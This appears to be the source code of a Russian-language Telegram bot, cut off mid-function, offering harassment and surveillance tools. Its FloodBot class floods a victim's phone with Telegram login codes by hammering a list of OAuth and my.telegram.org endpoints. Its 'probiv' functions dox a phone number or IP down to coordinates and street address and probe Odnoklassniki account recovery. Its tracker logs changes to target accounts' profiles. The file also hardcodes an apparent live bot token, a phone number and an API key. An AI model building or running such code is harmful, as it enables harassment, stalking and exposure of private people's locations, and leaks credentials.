import telebot
from telebot import types
import asyncio
import aiohttp
import random
import requests
import json
import urllib.request
from datetime import datetime, timedelta
import time
import threading
from fake_useragent import UserAgent
from bs4 import BeautifulSoup
from telethon import TelegramClient, errors
from telethon.tl.functions.account import UpdateProfileRequest
from telethon.tl.functions.photos import UploadProfilePhotoRequest, DeletePhotosRequest
from telethon.tl.types import InputPhoto
import sqlite3
import os
from hashlib import md5

# Конфигурация
BOT_TOKEN = "8274678821:AAGJBACLAhqr2CsNGjP-snFhgMv6zYGcPZE"
ADMIN_ID = 6893832048  # Замените на ваш ID
API_ID = None    # Заполните через команду /auth
API_HASH = None  # Заполните через команду /auth
PHONE_NUMBER = +79968886141

# Инициализация бота
bot = telebot.TeleBot(BOT_TOKEN)

# База данных
DB_NAME = "user_data.db"

def init_db():
    """Инициализация базы данных"""
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    
    # Таблица для слежки
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS tracking (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        target_username TEXT,
        target_id INTEGER,
        first_name TEXT,
        last_name TEXT,
        username TEXT,
        bio TEXT,
        avatar_hash TEXT,
        last_check TIMESTAMP,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )
    ''')
    
    # Таблица для защиты
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS protection (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        protected_id INTEGER,
        protected_username TEXT,
        reason TEXT,
        protected_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )
    ''')
    
    # Таблица для истории изменений
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS changes_history (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        target_id INTEGER,
        field_name TEXT,
        old_value TEXT,
        new_value TEXT,
        changed_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )
    ''')
    
    # Таблица для API данных
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS api_credentials (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        api_id INTEGER,
        api_hash TEXT,
        phone TEXT,
        authorized BOOLEAN DEFAULT 0,
        session_file TEXT
    )
    ''')
    
    conn.commit()
    conn.close()

init_db()

class ProtectionSystem:
    """Система защиты от злоупотреблений"""
    
    @staticmethod
    def is_protected(user_id):
        """Проверка, защищен ли пользователь"""
        conn = sqlite3.connect(DB_NAME)
        cursor = conn.cursor()
        
        cursor.execute('SELECT * FROM protection WHERE protected_id = ?', (user_id,))
        result = cursor.fetchone()
        
        conn.close()
        return result is not None
    
    @staticmethod
    def add_to_protection(user_id, username, reason="Защищенный пользователь"):
        """Добавить пользователя в защиту"""
        conn = sqlite3.connect(DB_NAME)
        cursor = conn.cursor()
        
        cursor.execute('''
        INSERT INTO protection (protected_id, protected_username, reason)
        VALUES (?, ?, ?)
        ''', (user_id, username, reason))
        
        conn.commit()
        conn.close()
    
    @staticmethod
    def remove_from_protection(user_id):
        """Удалить пользователя из защиты"""
        conn = sqlite3.connect(DB_NAME)
        cursor = conn.cursor()
        
        cursor.execute('DELETE FROM protection WHERE protected_id = ?', (user_id,))
        
        conn.commit()
        conn.close()
    
    @staticmethod
    def get_protected_users():
        """Получить список защищенных пользователей"""
        conn = sqlite3.connect(DB_NAME)
        cursor = conn.cursor()
        
        cursor.execute('SELECT protected_id, protected_username, reason FROM protection')
        users = cursor.fetchall()
        
        conn.close()
        return users

class AccountTracker:
    """Система слежки за аккаунтами Telegram"""
    
    def __init__(self):
        self.client = None
        self.tracking_enabled = False
        self.tracking_thread = None
    
    async def init_client(self, api_id, api_hash, phone):
        """Инициализация клиента Telethon"""
        try:
            session_name = f"session_{phone}"
            self.client = TelegramClient(session_name, api_id, api_hash)
            await self.client.connect()
            
            if not await self.client.is_user_authorized():
                # Отправляем код через бота
                return "need_code"
            
            return "authorized"
        except Exception as e:
            return f"error: {str(e)}"
    
    async def authorize_with_code(self, phone, api_id, api_hash, code):
        """Авторизация с кодом"""
        try:
            session_name = f"session_{phone}"
            self.client = TelegramClient(session_name, api_id, api_hash)
            await self.client.connect()
            
            await self.client.sign_in(phone, code)
            return "authorized"
        except Exception as e:
            return f"error: {str(e)}"
    
    def hash_avatar(self, photo_bytes):
        """Создание хеша аватарки"""
        return md5(photo_bytes).hexdigest() if photo_bytes else None
    
    async def get_user_info(self, username):
        """Получение информации о пользователе"""
        try:
            user = await self.client.get_entity(username)
            
            # Получаем фото профиля
            avatar_hash = None
            if user.photo:
                try:
                    photo = await self.client.download_profile_photo(user, file=bytes)
                    avatar_hash = self.hash_avatar(photo)
                except:
                    avatar_hash = None
            
            return {
                'id': user.id,
                'first_name': user.first_name,
                'last_name': user.last_name,
                'username': user.username,
                'bio': getattr(user, 'about', ''),
                'avatar_hash': avatar_hash,
                'premium': getattr(user, 'premium', False)
            }
        except Exception as e:
            print(f"Error getting user info: {e}")
            return None
    
    def save_tracking_info(self, user_id, target_info):
        """Сохранение информации для слежки"""
        conn = sqlite3.connect(DB_NAME)
        cursor = conn.cursor()
        
        cursor.execute('''
        INSERT INTO tracking (user_id, target_username, target_id, first_name, 
                            last_name, username, bio, avatar_hash, last_check)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            user_id,
            target_info.get('username', ''),
            target_info['id'],
            target_info['first_name'],
            target_info['last_name'],
            target_info['username'],
            target_info['bio'],
            target_info['avatar_hash'],
            datetime.now()
        ))
        
        conn.commit()
        conn.close()
    
    def get_tracking_info(self, user_id, target_username):
        """Получение сохраненной информации"""
        conn = sqlite3.connect(DB_NAME)
        cursor = conn.cursor()
        
        cursor.execute('''
        SELECT * FROM tracking 
        WHERE user_id = ? AND target_username = ? 
        ORDER BY last_check DESC LIMIT 1
        ''', (user_id, target_username))
        
        result = cursor.fetchone()
        conn.close()
        return result
    
    def save_change_history(self, target_id, field_name, old_value, new_value):
        """Сохранение истории изменений"""
        conn = sqlite3.connect(DB_NAME)
        cursor = conn.cursor()
        
        cursor.execute('''
        INSERT INTO changes_history (target_id, field_name, old_value, new_value)
        VALUES (?, ?, ?, ?)
        ''', (target_id, field_name, old_value, new_value))
        
        conn.commit()
        conn.close()
    
    def update_tracking_info(self, user_id, target_info):
        """Обновление информации о слежке"""
        conn = sqlite3.connect(DB_NAME)
        cursor = conn.cursor()
        
        cursor.execute('''
        UPDATE tracking 
        SET first_name = ?, last_name = ?, username = ?, 
            bio = ?, avatar_hash = ?, last_check = ?
        WHERE user_id = ? AND target_id = ?
        ''', (
            target_info['first_name'],
            target_info['last_name'],
            target_info['username'],
            target_info['bio'],
            target_info['avatar_hash'],
            datetime.now(),
            user_id,
            target_info['id']
        ))
        
        conn.commit()
        conn.close()
    
    async def check_for_changes(self, user_id, target_username):
        """Проверка изменений в аккаунте"""
        old_info = self.get_tracking_info(user_id, target_username)
        if not old_info:
            return None
        
        new_info = await self.get_user_info(target_username)
        if not new_info:
            return None
        
        changes = []
        
        # Проверяем изменения имени
        if old_info[4] != new_info['first_name']:  # first_name
            changes.append({
                'field': 'Имя',
                'old': old_info[4],
                'new': new_info['first_name']
            })
            self.save_change_history(new_info['id'], 'first_name', old_info[4], new_info['first_name'])
        
        # Проверяем изменения фамилии
        if old_info[5] != new_info['last_name']:  # last_name
            changes.append({
                'field': 'Фамилия',
                'old': old_info[5],
                'new': new_info['last_name']
            })
            self.save_change_history(new_info['id'], 'last_name', old_info[5], new_info['last_name'])
        
        # Проверяем изменения username
        if old_info[6] != new_info['username']:  # username
            changes.append({
                'field': 'Username',
                'old': old_info[6],
                'new': new_info['username']
            })
            self.save_change_history(new_info['id'], 'username', old_info[6], new_info['username'])
        
        # Проверяем изменения био
        if old_info[7] != new_info['bio']:  # bio
            changes.append({
                'field': 'Био',
                'old': old_info[7],
                'new': new_info['bio']
            })
            self.save_change_history(new_info['id'], 'bio', old_info[7], new_info['bio'])
        
        # Проверяем изменения аватарки
        if old_info[8] != new_info['avatar_hash']:  # avatar_hash
            changes.append({
                'field': 'Аватарка',
                'old': 'Была изменена',
                'new': 'Изменена на новую'
            })
            self.save_change_history(new_info['id'], 'avatar', old_info[8], new_info['avatar_hash'])
        
        # Обновляем информацию
        self.update_tracking_info(user_id, new_info)
        
        return changes if changes else None

class FloodBot:
    def __init__(self):
        self.ua = UserAgent()
        self.urls = [
            'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin',
            'https://translations.telegram.org/auth/request',
            'https://oauth.telegram.org/auth?bot_id=5444323279&origin=https%3A%2F%2Ffragment.com&request_access=write&return_to=https%3A%2F%2Ffragment.com%2F',
            'https://oauth.telegram.org/auth?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&request_access=write&return_to=https%3A%2F%2Fbot-t.com%2Flogin',
            'https://oauth.telegram.org/auth/request?bot_id=1093384146&origin=https%3A%2F%2Foff-bot.ru&embed=1&request_access=write&return_to=https%3A%2F%2Foff-bot.ru%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
            'https://oauth.telegram.org/auth/request?bot_id=466141824&origin=https%3A%2F%2Fmipped.com&embed=1&request_access=write&return_to=https%3A%2F%2Fmipped.com%2Ff%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
            'https://oauth.telegram.org/auth/request?bot_id=5463728243&origin=https%3A%2F%2Fwww.spot.uz&return_to=https%3A%2F%2Fwww.spot.uz%2Fru%2F2022%2F04%2F29%2Fyoto%2F%23',
            'https://oauth.telegram.org/auth/request?bot_id=1733143901&origin=https%3A%2F%2Ftbiz.pro&embed=1&request_access=write&return_to=https%3A%2F%2Ftbiz.pro%2Flogin',
            'https://oauth.telegram.org/auth/request?bot_id=319709511&origin=https%3A%2F%2Ftelegrambot.biz&embed=1&return_to=https%3A%2F%2Ftelegrambot.biz%2F',
            'https://oauth.telegram.org/auth/request?bot_id=1803424014&origin=https%3A%2F%2Fru.telegram-store.com&embed=1&request_access=write&return_to=https%3A%2F%2Fru.telegram-store.com%2Fcatalog%2Fsearch',
            'https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https%3A%2F%2Fcombot.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcombot.org%2Flogin',
            'https://my.telegram.org/auth/send_password'
        ]

    async def send_request(self, session, url, headers, data):
        try:
            async with session.post(url, headers=headers, data=data) as response:
                return response.status == 200
        except:
            return False

    async def start_flood(self, phone, cycles, message=None):
        # Проверка защиты
        if ProtectionSystem.is_protected(int(phone)):
            if message:
                bot.send_message(message.chat.id, "❌ Этот номер защищен от флуда!")
            return 0
        
        success_count = 0
        total_requests = len(self.urls) * cycles
        
        if message:
            status_msg = bot.send_message(message.chat.id, 
                                        f"🚀 Запускаем флуд...\n"
                                        f"📱 Номер: {phone}\n"
                                        f"🔄 Циклов: {cycles}\n"
                                        f"📊 Всего запросов: {total_requests}")

        try:
            async with aiohttp.ClientSession() as session:
                for cycle in range(cycles):
                    if message:
                        try:
                            bot.edit_message_text(
                                f"⏳ Выполняется цикл {cycle + 1}/{cycles}\n"
                                f"✅ Успешно: {success_count}\n"
                                f"📱 Номер: {phone}",
                                message.chat.id,
                                status_msg.message_id
                            )
                        except:
                            pass

                    user_agent = self.ua.random
                    headers = {'user-agent': user_agent}
                    
                    tasks = [self.send_request(session, url, headers, {'phone': phone}) for url in self.urls]
                    results = await asyncio.gather(*tasks)
                    
                    cycle_success = sum(results)
                    success_count += cycle_success
                    
                    await asyncio.sleep(0.5)

        except Exception as e:
            if message:
                bot.send_message(message.chat.id, f"❌ Ошибка: {str(e)}")
            return 0

        return success_count

class ProbivBot:
    def __init__(self):
        self.ua = UserAgent()
        self.htmlweb_url = "https://htmlweb.ru/geo/api.php?json&telcod="
        self.veriphone_url = "https://api.veriphone.io/v2/verify?phone="
        self.veriphone_key = "133DF840CE4B40AEABC341B7CA407A2D"
        self.ok_login_url = 'https://www.ok.ru/dk?st.cmd=anonymMain&st.accRecovery=on&st.error=errors.password.wrong'
        self.ok_recover_url = 'https://www.ok.ru/dk?st.cmd=anonymRecoveryAfterFailedLogin&st._aid=LeftColumn_Login_ForgotPassword'

    def get_address_by_coordinates(self, latitude, longitude):
        address_url = f"https://nominatim.openstreetmap.org/reverse?format=json&lat={latitude}&lon={longitude}"
        try:
            address_response = urllib.request.urlopen(address_url)
            address_data = json.load(address_response)
            if "address" in address_data:
                return self.sort_address(address_data["address"])
            return "Адрес не найден"
        except Exception as e:
            return f"Ошибка: {e}"

    def sort_address(self, address):
        address_order = ["road", "house_number", "village", "town", "suburb", "postcode"]
        sorted_address = {}
        for key in address_order:
            if key in address:
                sorted_address[key] = address[key]
        return sorted_address

    def translate_address(self, address):
        translations = {
            "road": "Улица", "house_number": "Номер дома", "village": "Деревня",
            "town": "Городок", "suburb": "Район", "postcode": "Почтовый индекс"
        }
        translated = {}
        for key, value in address.items():
            translated[translations.get(key, key)] = value
        return translated

    def check_ok(self, phone):
        try:
            session = requests.Session()
            session.get(f'{self.ok_login_url}&st.email={phone}', timeout=10)
            request = session.get(self.ok_recover_url, timeout=10)
            soup = BeautifulSoup(request.content, 'html.parser')
            
            if soup.find('div', {'data-l': 'registrationContainer,offer_contact_rest'}):
                account_info = soup.find('div', {'class': 'ext-registration_tx taCenter'})
                if account_info:
                    name = account_info.find('div', {'class': 'ext-registration_username_header'})
                    name = name.get_text() if name else "Неизвестно"
                    profile_info = account_info.findAll('div', {'class': 'lstp-t'})
                    profile_text = profile_info[0].get_text() if profile_info else "Нет информации"
                    return f"✅ Аккаунт найден\n👤 Имя: {name}\nℹ️ {profile_text}"
            return "❌ Аккаунт не найден"
        except:
            return "❌ Ошибка проверки"

    def probiv_po_nomeru(self, phone):
        # Проверка защиты
        if ProtectionSystem.is_protected(int(phone)):
            return "❌ Этот номер защищен от пробива!"
        
        results = []
        headers = {"User-Agent": self.ua.random}

        try:
            # HTMLWEB
            response = requests.get(self.htmlweb_url + phone, headers=headers, timeout=10)
            if response.status_code == 200:
                data = response.json()
                country = data.get("country", {}).get("name", "Неизвестно")
                region = data.get("region", {}).get("name", "Неизвестно")
                city = data.get("0", {}).get("name", "Неизвестно")
                operator = data.get("0", {}).get("oper", "Неизвестно")
                latitude = data.get("0", {}).get("latitude", "Неизвестно")
                longitude = data.get("0", {}).get("longitude", "Неизвестно")
                
                results.append(f"🌍 Страна: {country}")
                results.append(f"🏙 Регион: {region}")
                results.append(f"🏢 Город: {city}")
                results.append(f"📡 Оператор: {operator}")
                
                # Координаты и адрес
                if latitude != "Неизвестно" and longitude != "Неизвестно":
                    results.append(f"📍 Координаты: {latitude}, {longitude}")
                    address = self.get_address_by_coordinates(latitude, longitude)
                    if isinstance(address, dict):
                        translated = self.translate_address(address)
                        for key, value in translated.items():
                            results.append(f"🏠 {key}: {value}")
            else:
                results.append("❌ HTMLWEB: данные не получены")
        except Exception as e:
            results.append(f"❌ HTMLWEB ошибка: {e}")

        try:
            # Veriphone
            response = requests.get(f"{self.veriphone_url}{phone}&key={self.veriphone_key}", timeout=10)
            if response.status_code == 200:
                data = response.json()
                phone_type = data.get("phone_type", "Неизвестно")
                valid = data.get("phone_valid", False)
                results.append(f"📞 Тип: {phone_type}")
                results.append(f"✅ Валидность: {'Да' if valid else 'Нет'}")
            else:
                results.append("❌ Veriphone: данные не получены")
        except Exception as e:
            results.append(f"❌ Veriphone ошибка: {e}")

        # Одноклассники
        ok_result = self.check_ok(phone)
        results.append(f"👤 Одноклассники: {ok_result}")

        return "\n".join(results)

    def probiv_po_ip(self, ip):
        def search_by_ip(ip):
            ip_info_url = f"https://ipinfo.io/{ip}/json"
            try:
                ip_info_response = urllib.request.urlopen(ip_info_url)
                ip_info = json.load(ip_info_response)
            except:
                return "Информация по IP не найдена."

            result = {
                "query": ip_info.get('ip', 'Неизвестно'),
                "city": ip_info.get('city', 'Неизвестно'),
                "region": ip_info.get('region', 'Неизвестно'),
                "country": ip_info.get('country', 'Неизвестно'),
                "org": ip_info.get('org', 'Неизвестно'),
                "loc": ip_info.get('loc', '')
            }

            if result["loc"]:
                latitude, longitude = result["loc"].split(",")
                result["lat"] = latitude
                result["lon"] = longitude
                address = self.get_address_by_coordinates(latitude, longitude)
                result["address"] = address

            return result

        result = search_by_ip(ip)
        if isinstance(result, str):
            return result

        response = [
            f"🌐 IP: {result.get('query', 'Неизвестно')}",
            f"🌍 Страна: {result.get('country', 'Неизвестно')}",
            f"🏙 Регион: {result.get('region', 'Неизвестно')}",
            f"🏢 Город: {result.get('city', 'Неизвестно')}",
            f"📡 Провайдер: {result.get('org', 'Неизвестно')}",
            f"📍 Координаты: {result.get('lat', 'Неизвестно')}, {result.get('lon', 'Неизвестно')}"
        ]

        if isinstance(result.get("address"), dict):
            translated = self.translate_address(result["address"])
            for key, value in translated.items():
                response.append(f"🏠 {key}: {value}")
        else:
            response.append(f"🏠 Адрес: {result.get('address', 'Неизвестно')}")

        return "\n".join(response)

# Инициализация классов
flood_bot = FloodBot()
probiv_bot = ProbivBot()
tracker = AccountTracker()
protection = ProtectionSystem()

# Добавляем администратора в защиту
if ADMIN_ID:
    ProtectionSystem.add_to_protection(ADMIN_ID, "ADMIN", "Администратор бота")

# Хранилище для авторизации
auth_storage = {}

@bot.message_handler(commands=['start'])
def start_message(message):
    # Проверка на администратора
    is_admin = ADMIN_ID and message.from_user.id == ADMIN_ID
    
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    
    if is_admin:
        item_admin = types.KeyboardButton("⚙️ Админ-панель")
        markup.add(item_admin)
    
    item1 = types.KeyboardButton("📱 Флуд кодами")
    item2 = types.KeyboardButton("🔍 Пробив по номеру")
    item3 = types.KeyboardButton("🌐 Пробив по IP")
    item4 = types.KeyboardButton("👁 Слежка за аккаунтом")
    item5 = types.KeyboardButton("❓ Помощь")
    item6 = types.KeyboardButton("🔐 Авторизация Telethon")
    
    if is_admin:
        markup.add(item1, item2, item3, item4, item5, item6)
    else:
        markup.add(item1, item2, item3, item5)
    
    welcome_text = "🔥 Универсальный бот с расширенными функциями\n\n"
    if is_admin:
        welcome_text += "👑 Вы администратор\n"
    
    welcome_text += "Выберите нужную функцию:"
    
    bot.send_message(message.chat.id, welcome_text, reply_markup=markup)

@bot.message_handler(func=lambda message: message.text == "⚙️ Админ-панель")
def admin_panel(message):
    if ADMIN_ID and message.from_user.id != ADMIN_ID:
        bot.send_message(message.chat.id, "❌ У вас нет прав администратора!")
        return
    
    markup = types.InlineKeyboardMarkup()
    btn1 = types.InlineKeyboardButton("📋 Защищенные пользователи", callback_data="admin_protected")
    btn2 = types.InlineKeyboardButton("🛡 Добавить защиту", callback_data="admin_add_protection")
    btn3 = types.InlineKeyboardButton("🗑 Удалить защиту", callback_data="admin_remove_protection")
    btn4 = types.InlineKeyboardButton("📊 Статистика", callback_data="admin_stats")
    markup.add(btn1)
    markup.add(btn2, btn3)
    markup.add(btn4)
    
    bot.send_message(message.chat.id, "⚙️ Админ-панель:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith('admin_'))
def admin_callback_handler(call):
    if ADMIN_ID and call.from_user.id != ADMIN_ID:
        bot.answer_callback_query(call.id, "❌ У вас нет прав!")
        return
    
    if call.data == "admin_protected":
        users = ProtectionSystem.get_protected_users()
        if not users:
            text = "📭 Список защищенных пользователей пуст"
        else:
            text = "🛡 Защищенные пользователи:\n\n"
            for user in users:
                text += f"ID: {user[0]}\nUsername: {user[1]}\nПричина: {user[2]}\n\n"
        
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id)
    
    elif call.data == "admin_add_protection":
        msg = bot.send_message(call.message.chat.id, "Введите ID пользователя для защиты:")
        bot.register_next_step_handler(msg, process_add_protection)
    
    elif call.data == "admin_remove_protection":
        msg = bot.send_message(call.message.chat.id, "Введите ID пользователя для снятия защиты:")
        bot.register_next_step_handler(msg, process_remove_protection)
    
    elif call.data == "admin_stats":
        conn = sqlite3.connect(DB_NAME)
        cursor = conn.cursor()
        
        cursor.execute('SELECT COUNT(*) FROM tracking')
        tracking_count = cursor.fetchone()[0]
        
        cursor.execute('SELECT COUNT(*) FROM protection')
        protection_count = cursor.fetchone()[0]
        
        cursor.execute('SELECT COUNT(*) FROM changes_history')
        changes_count = cursor.fetchone()[0]
        
        conn.close()
        
        text = f"📊 Статистика бота:\n\n"
        text += f"👁 Активных слежек: {tracking_count}\n"
        text += f"🛡 Защищенных пользователей: {protection_count}\n"
        text += f"📝 Зафиксировано изменений: {changes_count}\n"
        
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id)

def process_add_protection(message):
    try:
        user_id = int(message.text.strip())
        ProtectionSystem.add_to_protection(user_id, "Защищен администратором")
        bot.send_message(message.chat.id, f"✅ Пользователь {user_id} добавлен в защиту")
    except:
        bot.send_message(message.chat.id, "❌ Ошибка! Введите корректный ID")

def process_remove_protection(message):
    try:
        user_id = int(message.text.strip())
        ProtectionSystem.remove_from_protection(user_id)
        bot.send_message(message.chat.id, f"✅ Защита с пользователя {user_id} снята")
    except:
        bot.send_message(message.chat.id, "❌ Ошибка! Введите корректный ID")

# Флуд кодами (без изменений)
@bot.message_handler(func=lambda message: message.text == "📱 Флуд кодами")
def start_flood_handler(message):
    msg = bot.send_message(message.chat.id, "Введите номер телефона (только цифры, с кодом страны):")
    bot.register_next_step_handler(msg, process_phone_input)

def process_phone_input(message):
    phone = message.text.strip()
    if not phone.isdigit() or len(phone) < 10:
        bot.send_message(message.chat.id, "❌ Неверный формат номера")
        return
    bot.send_message(message.chat.id, f"📱 Номер принят: +{phone}")
    msg = bot.send_message(message.chat.id, "Введите количество циклов (1-50):")
    bot.register_next_step_handler(msg, process_cycles_input, phone)

def process_cycles_input(message, phone):
    try:
        cycles = int(message.text.strip())
        if cycles <= 0 or cycles > 50:
            bot.send_message(message.chat.id, "❌ Количество циклов должно быть от 1 до 50")
            return
        msg = bot.send_message(message.chat.id, "Введите ник (или '-' для пропуска):")
        bot.register_next_step_handler(msg, process_nick_input, phone, cycles)
    except ValueError:
        bot.send_message(message.chat.id, "❌ Введите число!")

def process_nick_input(message, phone, cycles):
    nick = message.text.strip()
    if nick == '-':
        nick = "ARMAT"
    bot.send_message(message.chat.id, 
                    f"🎯 Параметры:\n📱 Номер: +{phone}\n🔄 Циклов: {cycles}\n👤 Ник: {nick}\n🚀 Запускаем...")
    asyncio.run(run_flood_async(phone, cycles, message))

async def run_flood_async(phone, cycles, message):
    success_count = await flood_bot.start_flood(phone, cycles, message)
    result_text = (f"📊 Флуд завершен!\n📱 Номер: +{phone}\n🔄 Циклов: {cycles}\n"
                  f"✅ Успешных запросов: {success_count}\n"
                  f"📈 Эффективность: {(success_count/(len(flood_bot.urls)*cycles))*100:.1f}%")
    bot.send_message(message.chat.id, result_text)

# Пробив по номеру
@bot.message_handler(func=lambda message: message.text == "🔍 Пробив по номеру")
def probiv_nomer_handler(message):
    msg = bot.send_message(message.chat.id, "Введите номер телефона для пробива:")
    bot.register_next_step_handler(msg, process_probiv_nomer)

def process_probiv_nomer(message):
    phone = message.text.strip()
    if not phone.isdigit() or len(phone) < 10:
        bot.send_message(message.chat.id, "❌ Неверный формат номера")
        return
    
    wait_msg = bot.send_message(message.chat.id, "🔍 Ищем информацию...")
    
    try:
        result = probiv_bot.probiv_po_nomeru(phone)
        bot.edit_message_text(f"📊 Результаты для +{phone}:\n\n{result}", 
                            message.chat.id, wait_msg.message_id)
    except Exception as e:
        bot.edit_message_text(f"❌ Ошибка: {str(e)}", message.chat.id, wait_msg.message_id)

# Пробив по IP
@bot.message_handler(func=lambda message: message.text == "🌐 Пробив по IP")
def probiv_ip_handler(message):
    msg = bot.send_message(message.chat.id, "Введите IP адрес для пробива:")
    bot.register_next_step_handler(msg, process_probiv_ip)

def process_probiv_ip(message):
    ip = message.text.strip()
    
    wait_msg = bot.send_message(message.chat.id, "🔍 Ищем информацию по IP...")
    
    try:
        result = probiv_bot.probiv_po_ip(ip)
        bot.edit_message_text(f"🌐 Результаты для {ip}:\n\n{result}", 
                            message.chat.id, wait_msg.message_id)
    except Exception as e:
        bot.edit_message_text(f"❌ Ошибка: {str(e)}", message.chat.id, wait_msg.message_id)

# Авторизация Telethon
@bot.message_handler(func=lambda message: message.text == "🔐 Авторизация Telethon")
def auth_handler(message):
    if ADMIN_ID and message.from_user.id != ADMIN_ID:
        bot.send_message(message.chat.id, "❌ Эта функция доступна только администратору!")
        return
    
    msg = bot.send_message(message.chat.id, 
                          "🔐 Авторизация Telethon\n\n"
                          "Введите API ID (получить на my.telegram.org):")
    bot.register_next_step_handler(msg, process_api_id)

def process_api_id(message):
    try:
        api_id = int(message.text.strip())
        auth_storage[message.chat.id] = {'api_id': api_id}
        msg = bot.send_message(message.chat.id, "Введите API Hash:")
        bot.register_next_step_handler(msg, process_api_hash)
    except:
        bot.send_message(message.chat.id, "❌ Неверный API ID!")

def process_api_hash(message):
    api_hash = message.text.strip()
    if not api_hash:
        bot.send_message(message.chat.id, "❌ Неверный API Hash!")
        return
    
    if message.chat.id in auth_storage:
        auth_storage[message.chat.id]['api_hash'] = api_hash
        msg = bot.send_message(message.chat.id, "Введите номер телефона (с кодом страны, например +79991234567):")
        bot.register_next_step_handler(msg, process_phone_auth)

def process_phone_auth(message):
    phone = message.text.strip()
    if not phone.startswith('+'):
        bot.send_message(message.chat.id, "❌ Номер должен начинаться с +")
        return
    
    if message.chat.id in auth_storage:
        auth_storage[message.chat.id]['phone'] = phone
        
        # Сохраняем в БД
        conn = sqlite3.connect(DB_NAME)
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO api_credentials (api_id, api_hash, phone)
            VALUES (?, ?, ?)
        ''', (
            auth_storage[message.chat.id]['api_id'],
            auth_storage[message.chat.id]['api_hash'],
            phone
        ))
        conn.commit()
        conn.close()
        
        bot.send_message(message.chat.id, "✅ Данные сохранены!\n\nТеперь используйте команду /login для авторизации")

@bot.message_handler(commands=['login'])
def login_handler(message):
    if ADMIN_ID and message.from_user.id != ADMIN_ID:
        bot.send_message(message.chat.id, "❌ Эта функция доступна только администратору!")
        return
    
    # Получаем данные из БД
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute('SELECT api_id, api_hash, phone FROM api_credentials ORDER BY id DESC LIMIT 1')
    data = cursor.fetchone()
    conn.close()
    
    if not data:
        bot.send_message(message.chat.id, "❌ Сначала настройте API данные через меню авторизации!")
        return
    
    api_id, api_hash, phone = data
    
    # Запускаем асинхронную авторизацию
    async def auth_async():
        result = await tracker.init_client(api_id, api_hash, phone)
        if result == "need_code":
            msg = bot.send_message(message.chat.id, "📲 Код отправлен на Telegram. Введите код:")
            bot.register_next_step_handler(msg, process_auth_code, api_id, api_hash, phone)
        elif result == "authorized":
            bot.send_message(message.chat.id, "✅ Успешная авторизация!")
        else:
            bot.send_message(message.chat.id, f"❌ Ошибка: {result}")
    
    asyncio.run(auth_async())

def process_auth_code(message, api_id, api_hash, phone):
    code = message.text.strip()
    
    async def auth_with_code():
        result = await tracker.authorize_with_code(phone, api_id, api_hash, code)
        if result == "authorized":
            bot.send_message(message.chat.id, "✅ Успешная авторизация!")
        else:
            bot.send_message(message.chat.id, f"❌ Ошибка авторизации: {result}")
    
    asyncio.run(auth_with_code())

# Слежка за аккаунтом
@bot.message_handler(func=lambda message: message.text == "👁 Слежка за аккаунтом")
def tracking_handler(message):
    if ADMIN_ID and message.from_user.id != ADMIN_ID:
        bot.send_message(message.chat.id, "❌ Эта функция доступна только администратору!")
        return
    
    # Проверяем авторизацию
    if tracker.client is None:
        bot.send_message(message.chat.id, 
                        "❌ Telethon не авторизован!\n"
                        "Сначала выполните авторизацию через меню '🔐 Авторизация Telethon'")
        return
    
    markup = types.InlineKeyboardMarkup()
    btn1 = types.InlineKeyboardButton("➕ Добавить аккаунт", callback_data="track_add")
    btn2 = types.InlineKeyboardButton("📋 Мои отслеживания", callback_data="track_list")
    btn3 = types.InlineKeyboardButton("⚙️ Настройки слежки", callback_data="track_settings")
    markup.add(btn1, btn2)
    markup.add(btn3)
    
    bot.send_message(message.chat.id, "👁 Система слежки за аккаунтами:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith('track_'))
def tracking_callback_handler(call):
    if ADMIN_ID and call.from_user.id != ADMIN_ID:
        bot.answer_callback_query(call.id, "❌ У вас нет прав!")
        return
    
    if call.data == "track_add":
        msg = bot.send_message(call.message.chat.id, "Введите username аккаунта для слежки (например, @username или username):")
        bot.register_next_step_handler(msg, process_track_add, call.from_user.id)
    
    elif call.data == "track_list":
        # Получаем список отслеживаемых аккаунтов
        conn = sqlite3.connect(DB_NAME)
        cursor = conn.cursor()
        cursor.execute('''
            SELECT target_username, last_check FROM tracking 
            WHERE user_id = ? 
            ORDER BY last_check DESC
        ''', (call.from_user.id,))
        
        tracks = cursor.fetchall()
        conn.close()
        
        if not tracks:
            text = "📭 У вас нет отслеживаемых аккаунтов"
        else:
            text = "📋 Ваши отслеживаемые аккаунты:\n\n"
            for track in tracks:
                last_check = datetime.strptime(track[1], '%Y-%m-%d %H:%M:%S.%f')
                text += f"👤 @{track[0]}\n🕐 Последняя проверка: {last_check.strftime('%d.%m.%Y %H:%M')}\n\n"
        
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id)

def process_track_add(message, user_id):
    username = message.text.strip().replace('@', '')
    
    async def add_tracking():
        # Проверяем защиту
        try:
            user_info = await tracker.get_user_info(username)
            if user_info and ProtectionSystem.is_protected(user_info['id']):
                bot.send_message(message.chat.id, f"❌ Аккаунт @{username} защищен от слежки!")
